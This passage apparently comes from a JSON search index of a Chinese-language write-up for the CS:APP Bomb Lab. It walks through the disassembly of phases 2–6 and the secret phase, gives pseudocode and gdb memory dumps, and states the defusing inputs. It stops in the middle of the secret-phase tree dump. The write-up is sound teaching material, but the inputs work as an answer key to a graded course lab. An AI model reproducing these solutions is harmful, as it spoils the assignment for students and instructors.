15 05 00 00 callq 40143a <explode_bomb> 400f25: 48 83 c3 04 add $0x4,%rbx 400f29: 48 39 eb cmp %rbp,%rbx 400f2c: 75 e9 jne 400f17 <phase_2+0x1b> 400f2e: eb 0c jmp 400f3c <phase_2+0x40> 400f30: 48 8d 5c 24 04 lea 0x4(%rsp),%rbx 400f35: 48 8d 6c 24 18 lea 0x18(%rsp),%rbp 400f3a: eb db jmp 400f17 <phase_2+0x1b> 400f3c: 48 83 c4 28 add $0x28,%rsp 400f40: 5b pop %rbx 400f41: 5d pop %rbp 400f42: c3 read_six_numbers 000000000040145c < read_six_numbers >: 40145c: 48 83 ec 18 sub $0x18,%rsp 401460: 48 89 f2 mov %rsi,%rdx 401463: 48 8d 4e 04 lea 0x4(%rsi),%rcx 401467: 48 8d 46 14 lea 0x14(%rsi),%rax 40146b: 48 89 44 24 08 mov %rax,0x8(%rsp) 401470: 48 8d 46 10 lea 0x10(%rsi),%rax 401474: 48 89 04 24 mov %rax,(%rsp) 401478: 4c 8d 4e 0c lea 0xc(%rsi),%r9 40147c: 4c 8d 46 08 lea 0x8(%rsi),%r8 401480: be c3 25 40 00 mov $0x4025c3,%esi 401485: b8 00 00 00 00 mov $0x0,%eax 40148a: e8 61 f7 ff ff callq 400bf0 <__isoc99_sscanf@plt> 40148f: 83 f8 05 cmp $0x5,%eax 401492: 7f 05 jg 401499 <read_six_numbers+0x3d> 401494: e8 a1 ff ff ff callq 40143a <explode_bomb> 401499: 48 83 c4 18 add $0x18,%rsp 40149d: c3 retq \u7531\u6e90\u7801: phase2 \u5c06 input \u548c %rsp \u4f5c\u4e3a\u53c2\u6570\u8c03\u7528 read_six_numbers read_six_numbers \u8c03\u7528 sscanf \u8bfb\u5165 6 \u4e2a\u6574\u6570\u5230 M[%rsp] ~ M[%rsp+0x14] \u56e0\u6b64\u5148\u67e5\u770b format \u53c2\u6570\uff0c\u786e\u5b9a\u5f85\u8f93\u5165\u5b57\u7b26\u4e32\u7684\u683c\u5f0f ( gdb ) x / s 0x4025c3 0x4025c3 : \"%d %d %d %d %d %d\" \u8fdb\u800c\u89c2\u5bdf phase2 \u7684\u5269\u4f59\u90e8\u5206\u5982\u4f55\u5904\u7406\u8bfb\u5165\u7684 6 \u4e2a\u6570\uff0c\u7b2c\u4e00\u4e2a\u6570 M[%rsp] \u5fc5\u987b\u4e3a 1\uff0c\u7136\u540e\uff1a % rbx = % rsp + 4 ; % rbp = % rsp + 24 ; while ( % rbx != % rbp ) { % eax = M [ % rbx - 4 ] * 2 ; if ( M [ % rbx ] != % eax ) explode_bomb (); % rbx += 4 ; } \u56e0\u6b64\u7b54\u6848\u4e3a 1 2 4 8 16 32","title":"phase2"},{"location":"_csapp/_Labs/bomblab/#phase3","text":"0000000000400f43 < phase_3 >: 400f43: 48 83 ec 18 sub $0x18,%rsp 400f47: 48 8d 4c 24 0c lea 0xc(%rsp),%rcx 400f4c: 48 8d 54 24 08 lea 0x8(%rsp),%rdx 400f51: be cf 25 40 00 mov $0x4025cf,%esi 400f56: b8 00 00 00 00 mov $0x0,%eax 400f5b: e8 90 fc ff ff callq 400bf0 <__isoc99_sscanf@plt> 400f60: 83 f8 01 cmp $0x1,%eax 400f63: 7f 05 jg 400f6a <phase_3+0x27> 400f65: e8 d0 04 00 00 callq 40143a <explode_bomb> 400f6a: 83 7c 24 08 07 cmpl $0x7,0x8(%rsp) 400f6f: 77 3c ja 400fad <phase_3+0x6a> 400f71: 8b 44 24 08 mov 0x8(%rsp),%eax 400f75: ff 24 c5 70 24 40 00 jmpq *0x402470(,%rax,8) 400f7c: b8 cf 00 00 00 mov $0xcf,%eax 400f81: eb 3b jmp 400fbe <phase_3+0x7b> 400f83: b8 c3 02 00 00 mov $0x2c3,%eax 400f88: eb 34 jmp 400fbe <phase_3+0x7b> 400f8a: b8 00 01 00 00 mov $0x100,%eax 400f8f: eb 2d jmp 400fbe <phase_3+0x7b> 400f91: b8 85 01 00 00 mov $0x185,%eax 400f96: eb 26 jmp 400fbe <phase_3+0x7b> 400f98: b8 ce 00 00 00 mov $0xce,%eax 400f9d: eb 1f jmp 400fbe <phase_3+0x7b> 400f9f: b8 aa 02 00 00 mov $0x2aa,%eax 400fa4: eb 18 jmp 400fbe <phase_3+0x7b> 400fa6: b8 47 01 00 00 mov $0x147,%eax 400fab: eb 11 jmp 400fbe <phase_3+0x7b> 400fad: e8 88 04 00 00 callq 40143a <explode_bomb> 400fb2: b8 00 00 00 00 mov $0x0,%eax 400fb7: eb 05 jmp 400fbe <phase_3+0x7b> 400fb9: b8 37 01 00 00 mov $0x137,%eax 400fbe: 3b 44 24 0c cmp 0xc(%rsp),%eax 400fc2: 74 05 je 400fc9 <phase_3+0x86> 400fc4: e8 71 04 00 00 callq 40143a <explode_bomb> 400fc9: 48 83 c4 18 add $0x18,%rsp 400fcd: c3 \u9996\u5148\u8fd8\u662f\u770b sscanf \u7684 format: ( gdb ) x / s 0x4025cf 0x4025cf : \"%d %d\" \u4e24\u6570\u5206\u522b\u8bfb\u5230\u4e86 arg1 = M[%rsp+8] \u548c arg2 = M[%rsp+12] \u4e2d\uff0c\u5269\u4e0b\u7684\u90e8\u5206\u662f switch-case \u7ed3\u6784\uff0c\u7531\u9ad8\u4eae\u90e8\u5206: \u82e5\u4ee5\u65e0\u7b26\u53f7\u6570\u770b\u5f85 arg1 \uff0c\u5b83\u4e0d\u80fd\u8d85\u8fc7 7 \u901a\u8fc7\u8df3\u8f6c\u8868 M[0x402470 + arg1*8] \u51b3\u5b9a\u8fdb\u5165 0-7 \u54ea\u4e2a\u5206\u652f \u67e5\u770b\u8df3\u8f6c\u8868\u7684\u5185\u5bb9: ( gdb ) x / 8 xg 0x402470 0x402470 : 0x0000000000400f7c 0x0000000000400fb9 0x402480 : 0x0000000000400f83 0x0000000000400f8a 0x402490 : 0x0000000000400f91 0x0000000000400f98 0x4024a0 : 0x0000000000400f9f 0x0000000000400fa6 \u4efb\u9009\u4e00\u4e2a\uff0c\u53d6 0, 0xcf(207) \u5373\u53ef","title":"phase3"},{"location":"_csapp/_Labs/bomblab/#phase4","text":"phase4 000000000040100c < phase_4 >: 40100c: 48 83 ec 18 sub $0x18,%rsp 401010: 48 8d 4c 24 0c lea 0xc(%rsp),%rcx 401015: 48 8d 54 24 08 lea 0x8(%rsp),%rdx 40101a: be cf 25 40 00 mov $0x4025cf,%esi 40101f: b8 00 00 00 00 mov $0x0,%eax 401024: e8 c7 fb ff ff callq 400bf0 <__isoc99_sscanf@plt> 401029: 83 f8 02 cmp $0x2,%eax 40102c: 75 07 jne 401035 <phase_4+0x29> 40102e: 83 7c 24 08 0e cmpl $0xe,0x8(%rsp) 401033: 76 05 jbe 40103a <phase_4+0x2e> 401035: e8 00 04 00 00 callq 40143a <explode_bomb> 40103a: ba 0e 00 00 00 mov $0xe,%edx 40103f: be 00 00 00 00 mov $0x0,%esi 401044: 8b 7c 24 08 mov 0x8(%rsp),%edi 401048: e8 81 ff ff ff callq 400fce <func4> 40104d: 85 c0 test %eax,%eax 40104f: 75 07 jne 401058 <phase_4+0x4c> 401051: 83 7c 24 0c 00 cmpl $0x0,0xc(%rsp) 401056: 74 05 je 40105d <phase_4+0x51> 401058: e8 dd 03 00 00 callq 40143a <explode_bomb> 40105d: 48 83 c4 18 add $0x18,%rsp 401061: c3 retq func4 0000000000400fce < func4 >: 400fce: 48 83 ec 08 sub $0x8,%rsp 400fd2: 89 d0 mov %edx,%eax 400fd4: 29 f0 sub %esi,%eax 400fd6: 89 c1 mov %eax,%ecx 400fd8: c1 e9 1f shr $0x1f,%ecx 400fdb: 01 c8 add %ecx,%eax 400fdd: d1 f8 sar %eax 400fdf: 8d 0c 30 lea (%rax,%rsi,1),%ecx 400fe2: 39 f9 cmp %edi,%ecx 400fe4: 7e 0c jle 400ff2 <func4+0x24> 400fe6: 8d 51 ff lea -0x1(%rcx),%edx 400fe9: e8 e0 ff ff ff callq 400fce <func4> 400fee: 01 c0 add %eax,%eax 400ff0: eb 15 jmp 401007 <func4+0x39> 400ff2: b8 00 00 00 00 mov $0x0,%eax 400ff7: 39 f9 cmp %edi,%ecx 400ff9: 7d 0c jge 401007 <func4+0x39> 400ffb: 8d 71 01 lea 0x1(%rcx),%esi 400ffe: e8 cb ff ff ff callq 400fce <func4> 401003: 8d 44 00 01 lea 0x1(%rax,%rax,1),%eax 401007: 48 83 c4 08 add $0x8,%rsp 40100b: c3 phase_4 : \u548c phase3 \u4e00\u6837\u8bfb\u5165\u4e24\u4e2a\u6574\u6570\uff0c arg1 \u4f5c\u4e3a\u65e0\u7b26\u53f7\u6570\u5fc5\u987b <=14 \uff0c arg2 \u5fc5\u987b\u662f 0 \u8c03\u7528 func4(arg1, 0, 14) \uff0c\u4e14 func4 \u7684\u8fd4\u56de\u503c\u5fc5\u987b\u662f 0 func4 : shr $0x1f,%ecx \u548c add %ecx,%eax \u4f3c\u4e4e\u6ca1\u4ec0\u4e48\u7528 sar %eax \u76f8\u5f53\u4e8e sar $1,%eax func4 \u53ef\u4ee5\u5927\u81f4\u7ffb\u8bd1\u6210\u5982\u4e0b\u5f62\u5f0f /* pseudocode * x:%rdi, y:%rsi, z:%rdx, ret:%eax, mid:%ecx */ int func4 ( x , y , z ) { ret = z - y ; mid = ret >> 31 ; ret = ret + mid ; // seems useless ret = ret >> 1 ; mid = ret + y ; // mid = (z - y) / 2 + y if ( mid > x ) { z = mid - 1 ; ret = func4 ( x , y , z ); ret = ret + ret ; } ret = 0 ; if ( mid < x ) { y = mid + 1 ; ret = func4 ( x , y , z ); ret = ret + ret + 1 \uff1b } // mid == x here. return ret ; } \u53ef\u89c1\uff0c\u8fd9\u662f\u4e00\u4e2a\u4e8c\u5206\u67e5\u627e\uff0c\u4e14\u8981\u4f7f\u8fd4\u56de\u503c\u4e3a 0\uff0c\u4e00\u6b21\u5411\u53f3\u7684\u9012\u5f52\u4e5f\u4e0d\u80fd\u6709\uff0c arg1=7/3/1/0 \u5747\u53ef","title":"phase4"},{"location":"_csapp/_Labs/bomblab/#phase5","text":"0000000000401062 < phase_5 >: 401062: 53 push %rbx 401063: 48 83 ec 20 sub $0x20,%rsp 401067: 48 89 fb mov %rdi,%rbx 40106a: 64 48 8b 04 25 28 00 mov %fs:0x28,%rax 401071: 00 00 401073: 48 89 44 24 18 mov %rax,0x18(%rsp) 401078: 31 c0 xor %eax,%eax 40107a: e8 9c 02 00 00 callq 40131b <string_length> 40107f: 83 f8 06 cmp $0x6,%eax 401082: 74 4e je 4010d2 <phase_5+0x70> 401084: e8 b1 03 00 00 callq 40143a <explode_bomb> 401089: eb 47 jmp 4010d2 <phase_5+0x70> 40108b: 0f b6 0c 03 movzbl (%rbx,%rax,1),%ecx 40108f: 88 0c 24 mov %cl,(%rsp) 401092: 48 8b 14 24 mov (%rsp),%rdx 401096: 83 e2 0f and $0xf,%edx 401099: 0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx 4010a0: 88 54 04 10 mov %dl,0x10(%rsp,%rax,1) 4010a4: 48 83 c0 01 add $0x1,%rax 4010a8: 48 83 f8 06 cmp $0x6,%rax 4010ac: 75 dd jne 40108b <phase_5+0x29> 4010ae: c6 44 24 16 00 movb $0x0,0x16(%rsp) 4010b3: be 5e 24 40 00 mov $0x40245e,%esi 4010b8: 48 8d 7c 24 10 lea 0x10(%rsp),%rdi 4010bd: e8 76 02 00 00 callq 401338 <strings_not_equal> 4010c2: 85 c0 test %eax,%eax 4010c4: 74 13 je 4010d9 <phase_5+0x77> 4010c6: e8 6f 03 00 00 callq 40143a <explode_bomb> 4010cb: 0f 1f 44 00 00 nopl 0x0(%rax,%rax,1) 4010d0: eb 07 jmp 4010d9 <phase_5+0x77> 4010d2: b8 00 00 00 00 mov $0x0,%eax 4010d7: eb b2 jmp 40108b <phase_5+0x29> 4010d9: 48 8b 44 24 18 mov 0x18(%rsp),%rax 4010de: 64 48 33 04 25 28 00 xor %fs:0x28,%rax 4010e5: 00 00 4010e7: 74 05 je 4010ee <phase_5+0x8c> 4010e9: e8 42 fa ff ff callq 400b30 <__stack_chk_fail@plt> 4010ee: 48 83 c4 20 add $0x20,%rsp 4010f2: 5b pop %rbx 4010f3: c3 retq \u8be5\u6bb5\u4ee3\u7801\u9996\u5148\u5728 M[%rsp+16] ~ M[%rsp+22] \u4e4b\u95f4\u6784\u9020\u4e86\u4e00\u4e2a\u957f\u4e3a 6 \u7684\u5b57\u7b26\u6570\u7ec4 % rbx = % rdi ; M [ % rsp + 24 ] = % rax ; if ( string_length () != 6 ) explode_bomb (); % eax = 0 ; // M[%rbx] = input string while ( % rax != 6 ) { % ecx = M [ % rbx + % rax ]; // zero extend: M[%rbx+%rax] 1byte, %ecx 4bytes M [ % rsp ] = % ecx ; % rdx = M [ % rsp ]; % edx = % edx & 0x0f ; // bias % edx = M [ % rdx + 0x4024b0 ]; M [ % rsp + % rax + 16 ] = % edx ; // zero extend % rax = % rax + 1 ; } M [ % rsp + 22 ] = 0x0 ; \u5177\u4f53\u6784\u9020\u7684\u65b9\u6cd5\u662f\u53d6 b = input[i] & 0x0f \u7ed3\u679c\u4f5c\u4e3a\u504f\u79fb\uff0c\u518d\u53d6 M[0x4024b0 + b] \u5904\u7684\u5b57\u7b26\uff0c\u6784\u9020\u51fa\u4e00\u4e2a\u957f\u4e3a 6 \u7684\u5b57\u7b26\u4e32\uff0c\u5c06\u5b83\u4e0e 0x40245e \u5904\u7684\u5b57\u7b26\u4e32\u6bd4\u8f83\u3002 ( gdb ) x / s 0x40245e 0x40245e : \"flyers\" ( gdb ) x / 16 cb 0x4024b0 0x4024b0 < array .3449 >: 109 'm' 97 'a' 100 'd' 117 'u' 105 'i' 101 'e' 114 'r' 115 's' 0x4024b8 < array .3449 + 8 >: 110 'n' 102 'f' 111 'o' 116 't' 118 'v' 98 'b' 121 'y' 108 'l' \"flyers\" \u7684\u504f\u79fb\u4e3a b={9, 15, 14, 5, 6, 7} \uff0c\u6ee1\u8db3 input[i] & 0x0f = b[i] \u7684\u4efb\u610f\u5b57\u7b26\u4e32\u5747\u53ef (\u4f8b\u5982 ionefg)","title":"phase5"},{"location":"_csapp/_Labs/bomblab/#phase6","text":"phase_6.objdump 00000000004010f4 < phase_6 >: 4010f4: 41 56 push %r14 4010f6: 41 55 push %r13 4010f8: 41 54 push %r12 4010fa: 55 push %rbp 4010fb: 53 push %rbx 4010fc: 48 83 ec 50 sub $0x50,%rsp 401100: 49 89 e5 mov %rsp,%r13 401103: 48 89 e6 mov %rsp,%rsi 401106: e8 51 03 00 00 callq 40145c <read_six_numbers> 40110b: 49 89 e6 mov %rsp,%r14 40110e: 41 bc 00 00 00 00 mov $0x0,%r12d 401114: 4c 89 ed mov %r13,%rbp 401117: 41 8b 45 00 mov 0x0(%r13),%eax 40111b: 83 e8 01 sub $0x1,%eax 40111e: 83 f8 05 cmp $0x5,%eax 401121: 76 05 jbe 401128 <phase_6+0x34> 401123: e8 12 03 00 00 callq 40143a <explode_bomb> 401128: 41 83 c4 01 add $0x1,%r12d 40112c: 41 83 fc 06 cmp $0x6,%r12d 401130: 74 21 je 401153 <phase_6+0x5f> 401132: 44 89 e3 mov %r12d,%ebx 401135: 48 63 c3 movslq %ebx,%rax 401138: 8b 04 84 mov (%rsp,%rax,4),%eax 40113b: 39 45 00 cmp %eax,0x0(%rbp) 40113e: 75 05 jne 401145 <phase_6+0x51> 401140: e8 f5 02 00 00 callq 40143a <explode_bomb> 401145: 83 c3 01 add $0x1,%ebx 401148: 83 fb 05 cmp $0x5,%ebx 40114b: 7e e8 jle 401135 <phase_6+0x41> 40114d: 49 83 c5 04 add $0x4,%r13 401151: eb c1 jmp 401114 <phase_6+0x20> 401153: 48 8d 74 24 18 lea 0x18(%rsp),%rsi 401158: 4c 89 f0 mov %r14,%rax 40115b: b9 07 00 00 00 mov $0x7,%ecx 401160: 89 ca mov %ecx,%edx 401162: 2b 10 sub (%rax),%edx 401164: 89 10 mov %edx,(%rax) 401166: 48 83 c0 04 add $0x4,%rax 40116a: 48 39 f0 cmp %rsi,%rax 40116d: 75 f1 jne 401160 <phase_6+0x6c> 40116f: be 00 00 00 00 mov $0x0,%esi 401174: eb 21 jmp 401197 <phase_6+0xa3> 401176: 48 8b 52 08 mov 0x8(%rdx),%rdx 40117a: 83 c0 01 add $0x1,%eax 40117d: 39 c8 cmp %ecx,%eax 40117f: 75 f5 jne 401176 <phase_6+0x82> 401181: eb 05 jmp 401188 <phase_6+0x94> 401183: ba d0 32 60 00 mov $0x6032d0,%edx 401188: 48 89 54 74 20 mov %rdx,0x20(%rsp,%rsi,2) 40118d: 48 83 c6 04 add $0x4,%rsi 401191: 48 83 fe 18 cmp $0x18,%rsi 401195: 74 14 je 4011ab <phase_6+0xb7> 401197: 8b 0c 34 mov (%rsp,%rsi,1),%ecx 40119a: 83 f9 01 cmp $0x1,%ecx 40119d: 7e e4 jle 401183 <phase_6+0x8f> 40119f: b8 01 00 00 00 mov $0x1,%eax 4011a4: ba d0 32 60 00 mov $0x6032d0,%edx 4011a9: eb cb jmp 401176 <phase_6+0x82> 4011ab: 48 8b 5c 24 20 mov 0x20(%rsp),%rbx 4011b0: 48 8d 44 24 28 lea 0x28(%rsp),%rax 4011b5: 48 8d 74 24 50 lea 0x50(%rsp),%rsi 4011ba: 48 89 d9 mov %rbx,%rcx 4011bd: 48 8b 10 mov (%rax),%rdx 4011c0: 48 89 51 08 mov %rdx,0x8(%rcx) 4011c4: 48 83 c0 08 add $0x8,%rax 4011c8: 48 39 f0 cmp %rsi,%rax 4011cb: 74 05 je 4011d2 <phase_6+0xde> 4011cd: 48 89 d1 mov %rdx,%rcx 4011d0: eb eb jmp 4011bd <phase_6+0xc9> 4011d2: 48 c7 42 08 00 00 00 movq $0x0,0x8(%rdx) 4011d9: 00 4011da: bd 05 00 00 00 mov $0x5,%ebp 4011df: 48 8b 43 08 mov 0x8(%rbx),%rax 4011e3: 8b 00 mov (%rax),%eax 4011e5: 39 03 cmp %eax,(%rbx) 4011e7: 7d 05 jge 4011ee <phase_6+0xfa> 4011e9: e8 4c 02 00 00 callq 40143a <explode_bomb> 4011ee: 48 8b 5b 08 mov 0x8(%rbx),%rbx 4011f2: 83 ed 01 sub $0x1,%ebp 4011f5: 75 e8 jne 4011df <phase_6+0xeb> 4011f7: 48 83 c4 50 add $0x50,%rsp 4011fb: 5b pop %rbx 4011fc: 5d pop %rbp 4011fd: 41 5c pop %r12 4011ff: 41 5d pop %r13 401201: 41 5e pop %r14 401203: c3 retq translated pseudocode /* Part1: 0x401100-0x401151 */ % r13 = % rsp ; read_six_numbers ( % rsp ); % r14 = % rsp ; % r12d = 0x0 ; while ( true ) { % rbp = % r13 ; % eax = M [ % r13 ]; % eax = % eax - 1 ; if ( % eax > 5 ) explode_bomb (); % r12d = % r12d + 1 ; if ( % r12d == 6 ) break ; % ebx = % r12d ; // here: M[%rbp]=M[%rsp+i], %rax=M[%rsp+j], j ranges in [i+1, 5] while ( % ebx <= 5 ) { % rax = % ebx ; // signed extend: 4bytes to 8bytes % eax = M [ % rsp + % rax * 4 ]; if ( M [ % rbp ] == % rax ) explode_bomb (); % ebx = % ebx + 1 ; } % r13 = % r13 + 4 ; } /* Part2: 0x401153-0x401174 */ % rsi = % rsp + 24 ; % rax = % r14 ; // %r14=%rsp % ecx = 7 ; while ( % rax != % rsi ) { % edx = % ecx ; % edx = % edx - M [ % rax ]; M [ % rax ] = % edx ; % rax = % rax + 4 ; } % esi = 0 ; /* Part3: 0x401176-0x4011a9 */ // in: 0x401197, out: 0x401195 while ( % rsi != 24 ) { % ecx = M [ % rsp + % rsi ]; if ( % ecx <= 1 ) { % edx = 0x6032d0 ; } else { % eax = 1 ; % edx = 0x6032d0 ; while ( % eax != % ecx ) { % rdx = M [ % rdx + 8 ]; % eax = % eax + 1 ; } } M [ % rsp + 2 *% rsi + 32 ] = % rdx ; % rsi = % rsi + 4 ; } /* Part4: 0x4011ab-0x4011ba, 0x4011bd-0x4011d0 */ /* M[M[%rsp + 32 + 8*i] + 8] = M[%rsp + 40 + 8*i] */ % rbx = M [ % rsp + 32 ]; % rax = % rsp + 40 ; % rsi = % rsp + 80 ; % rcx = % rbx ; while ( true ) { % rdx = M [ % rax ]; M [ % rcx + 8 ] = % rdx ; % rax = % rax + 8 ; if ( % rax == % rsi ) break ; % rcx = % rdx ; } /* Part5: 0x4011d2-0x4011f7 */ /* M[M[%rsp + 32]] < M[M[M[%rsp + 32] + 8]] */ M [ % rdx + 8 ] = 0x0 ; % ebp = 5 ; while ( % ebp != 1 ) { % rax = M [ % rbx + 8 ]; % eax = M [ % rax ]; if ( M [ % rbx ] < % eax ) explode_bomb (); % rbx = M [ % rbx + 8 ]; % ebp = % ebp - 1 ; } CFG of Part4 \u628a\u6e90\u7801\u5206\u4e3a\u4e94\u4e2a\u90e8\u5206: Part1: \u2002 \u8bfb\u5165 6 \u4e2a\u6574\u6570\u5230 M[%rsp]~M[%rsp+32] (\u8bb0\u4e3a int arr1[6] )\uff0c\u8981\u6c42\u8fd9 6 \u4e2a\u6570\u5728 [1, 6] \u4e4b\u95f4\u4e14\u4e24\u4e24\u4e0d\u76f8\u7b49 Part2: \u2002 \u5206\u522b\u7528 7 \u51cf\u53bb\u8fd9 6 \u4e2a\u6570\uff0c\u5e76\u5b58\u56de\u539f\u4f4d Part3: \u2002 \u6839\u636e\u8fd9 6 \u4e2a\u6570\u7684\u503c\uff0c\u5c06\u94fe\u8868 0x6032d0 \u6bcf\u4e2a\u7ed3\u70b9\u7684\u5730\u5740\u5b58\u50a8\u4e8e M[%rsp+32]~M[%rsp+80] (\u8bb0\u4e3a int *arr2[6] \uff0c\u4e14 arr2[i] = LinkedList[arr1[i]] ) Part4: \u2002 \u6839\u636e arr2 \u5b58\u50a8\u7684\u7ed3\u70b9\u987a\u5e8f\uff0c\u5bf9\u539f\u94fe\u8868\u8fdb\u884c\u91cd\u6392 Part5: \u2002 \u68c0\u67e5\u539f\u94fe\u8868\uff0c\u8981\u6c42 LinkedList[i].value < LinkedList[i + 1].value \uff0c\u5373\u4ece\u5927\u5230\u5c0f\u6392\u5e8f \u67e5\u770b\u94fe\u8868\u7684\u5185\u5bb9: ( gdb ) x / 24 xw 0x6032d0 0x6032d0 < node1 >: 0x0000014c 0x00000001 0x006032e0 0x00000000 0x6032e0 < node2 >: 0x000000a8 0x00000002 0x006032f0 0x00000000 0x6032f0 < node3 >: 0x0000039c 0x00000003 0x00603300 0x00000000 0x603300 < node4 >: 0x000002b3 0x00000004 0x00603310 0x00000000 0x603310 < node5 >: 0x000001dd 0x00000005 0x00603320 0x00000000 0x603320 < node6 >: 0x000001bb 0x00000006 0x00000000 0x00000000 6 \u4e2a\u6574\u6570\u4e3a 332 168 924 691 477 473\uff0c\u5bf9\u5176\u8fdb\u884c\u6392\u5e8f\u3001\u9006\u5411\u5230\u6700\u5f00\u59cb\u7684\u8f93\u5165\u4e3a 4 3 2 1 6 5\u3002","title":"phase6"},{"location":"_csapp/_Labs/bomblab/#secret-phase","text":"phase_defused 00000000004015c4 < phase_defused >: 4015c4: 48 83 ec 78 sub $0x78,%rsp 4015c8: 64 48 8b 04 25 28 00 mov %fs:0x28,%rax 4015cf: 00 00 4015d1: 48 89 44 24 68 mov %rax,0x68(%rsp) 4015d6: 31 c0 xor %eax,%eax 4015d8: 83 3d 81 21 20 00 06 cmpl $0x6,0x202181(%rip) # 603760 <num_input_strings> 4015df: 75 5e jne 40163f <phase_defused+0x7b> 4015e1: 4c 8d 44 24 10 lea 0x10(%rsp),%r8 4015e6: 48 8d 4c 24 0c lea 0xc(%rsp),%rcx 4015eb: 48 8d 54 24 08 lea 0x8(%rsp),%rdx 4015f0: be 19 26 40 00 mov $0x402619,%esi 4015f5: bf 70 38 60 00 mov $0x603870,%edi 4015fa: e8 f1 f5 ff ff callq 400bf0 <__isoc99_sscanf@plt> 4015ff: 83 f8 03 cmp $0x3,%eax 401602: 75 31 jne 401635 <phase_defused+0x71> 401604: be 22 26 40 00 mov $0x402622,%esi 401609: 48 8d 7c 24 10 lea 0x10(%rsp),%rdi 40160e: e8 25 fd ff ff callq 401338 <strings_not_equal> 401613: 85 c0 test %eax,%eax 401615: 75 1e jne 401635 <phase_defused+0x71> 401617: bf f8 24 40 00 mov $0x4024f8,%edi 40161c: e8 ef f4 ff ff callq 400b10 <puts@plt> 401621: bf 20 25 40 00 mov $0x402520,%edi 401626: e8 e5 f4 ff ff callq 400b10 <puts@plt> 40162b: b8 00 00 00 00 mov $0x0,%eax 401630: e8 0d fc ff ff callq 401242 <secret_phase> 401635: bf 58 25 40 00 mov $0x402558,%edi 40163a: e8 d1 f4 ff ff callq 400b10 <puts@plt> 40163f: 48 8b 44 24 68 mov 0x68(%rsp),%rax 401644: 64 48 33 04 25 28 00 xor %fs:0x28,%rax 40164b: 00 00 40164d: 74 05 je 401654 <phase_defused+0x90> 40164f: e8 dc f4 ff ff callq 400b30 <__stack_chk_fail@plt> 401654: 48 83 c4 78 add $0x78,%rsp 401658: c3 retq \u4ed4\u7ec6\u89c2\u5bdf phase_defused \u8fd8\u8c03\u7528\u4e86 secret_phase \uff0c\u5176\u4e2d\u51e0\u6761\u5173\u952e\u6307\u4ee4: cmpl $0x6,0x202181(%rip) : \u5b58\u50a8 bomb \u5df2\u7ecf\u8bfb\u5165\u7684\u5b57\u7b26\u4e32\u6570\uff0c\u53ea\u6709\u7b49\u4e8e 6 \u624d\u4f1a\u7ee7\u7eed\u5411\u4e0b\u8d70 sscanf : mov $0x402619,%esi : \u2002 \"%d %d %s\" mov $0x603870,%edi : \u2002 \u5b58\u50a8 phase3 \u8f93\u5165\u7684\u5b57\u7b26\u4e32 mov $0x402622,%esi : DrEvil \u53ea\u9700\u5728 phase3 \u7684\u5b57\u7b26\u4e32\u540e\u8f93\u5165 DrEvil \u5373\u53ef\u8fdb\u5165 secret phase. secret_phase 0000000000401242 < secret_phase >: 401242: 53 push %rbx 401243: e8 56 02 00 00 callq 40149e <read_line> 401248: ba 0a 00 00 00 mov $0xa,%edx 40124d: be 00 00 00 00 mov $0x0,%esi 401252: 48 89 c7 mov %rax,%rdi 401255: e8 76 f9 ff ff callq 400bd0 <strtol@plt> 40125a: 48 89 c3 mov %rax,%rbx 40125d: 8d 40 ff lea -0x1(%rax),%eax 401260: 3d e8 03 00 00 cmp $0x3e8,%eax 401265: 76 05 jbe 40126c <secret_phase+0x2a> 401267: e8 ce 01 00 00 callq 40143a <explode_bomb> 40126c: 89 de mov %ebx,%esi 40126e: bf f0 30 60 00 mov $0x6030f0,%edi 401273: e8 8c ff ff ff callq 401204 <fun7> 401278: 83 f8 02 cmp $0x2,%eax 40127b: 74 05 je 401282 <secret_phase+0x40> 40127d: e8 b8 01 00 00 callq 40143a <explode_bomb> 401282: bf 38 24 40 00 mov $0x402438,%edi 401287: e8 84 f8 ff ff callq 400b10 <puts@plt> 40128c: e8 33 03 00 00 callq 4015c4 <phase_defused> 401291: 5b pop %rbx 401292: c3 retq \u2003fun7\u2003 0000000000401204 < fun7 >: 401204: 48 83 ec 08 sub $0x8,%rsp 401208: 48 85 ff test %rdi,%rdi 40120b: 74 2b je 401238 <fun7+0x34> 40120d: 8b 17 mov (%rdi),%edx 40120f: 39 f2 cmp %esi,%edx 401211: 7e 0d jle 401220 <fun7+0x1c> 401213: 48 8b 7f 08 mov 0x8(%rdi),%rdi 401217: e8 e8 ff ff ff callq 401204 <fun7> 40121c: 01 c0 add %eax,%eax 40121e: eb 1d jmp 40123d <fun7+0x39> 401220: b8 00 00 00 00 mov $0x0,%eax 401225: 39 f2 cmp %esi,%edx 401227: 74 14 je 40123d <fun7+0x39> 401229: 48 8b 7f 10 mov 0x10(%rdi),%rdi 40122d: e8 d2 ff ff ff callq 401204 <fun7> 401232: 8d 44 00 01 lea 0x1(%rax,%rax,1),%eax 401236: eb 05 jmp 40123d <fun7+0x39> 401238: b8 ff ff ff ff mov $0xffffffff,%eax 40123d: 48 83 c4 08 add $0x8,%rsp 401241: c3 retq secret_phase \u7684\u884c\u4e3a: \u5c06\u8bfb\u5165\u7684\u5b57\u7b26\u4e32\u901a\u8fc7 strtol \u8f6c\u6362\u4e3a\u6574\u6570 %edi \uff0c\u4e14 %edi \u5fc5\u987b <= 1001 \u7136\u540e\u8c03\u7528 fun7(0x6030f0, %edi) \uff0c\u8fd4\u56de\u503c\u5fc5\u987b\u7b49\u4e8e 2 fun7 \u53ef\u5927\u81f4\u7ffb\u8bd1\u5982\u4e0b: fun7 ( % rdi , % rsi ) { if ( % rdi == 0 ) return 0xffffffff ; // find empty node, return -1 % edx = M [ % rdi ]; if ( % edx <= % esi ) { % eax = 0x0 ; if ( % edx == % esi ) return % eax ; % rdi = M [ % rdi + 16 ]; % eax = fun7 ( % rdi , % rsi ); // right % eax = % rax + % rax + 1 ; } else { % rdi = M [ % rdi + 8 ]; % eax = fun7 ( % rdi , % rsi ); // left % eax = % eax + % eax ; } return % rax ; } gdb: view 0x6030f0 ( gdb ) x / 60 xg 0x6030f0 0x6030f0 < n1 >: 0x0000000000000024 0x0000000000603110 0x603100 < n1 + 16 >: 0x0000000000603130 0x0000000000000000 0x603110 < n21 >: 0x0000000000000008 0x0000000000603190 0x603120 < n21 + 16 >: 0x0000000000603150 0x0000000000000000 0x603130 < n22 >: 0x0000000000000032 0x0000000000603170 0x603140 < n22 + 16 >: 0x00000000006031b0 0x0000000000000000 0x603150 < n32 >: 0x0000000000000016 0x0000000000603270 0x603160 < n32 + 16 >: 0x0000000000603230 0x0000000000000000 0x603170 < n33 >: 0x000000000000002d 0x00000000006031d0 0x603180 < n33 + 16 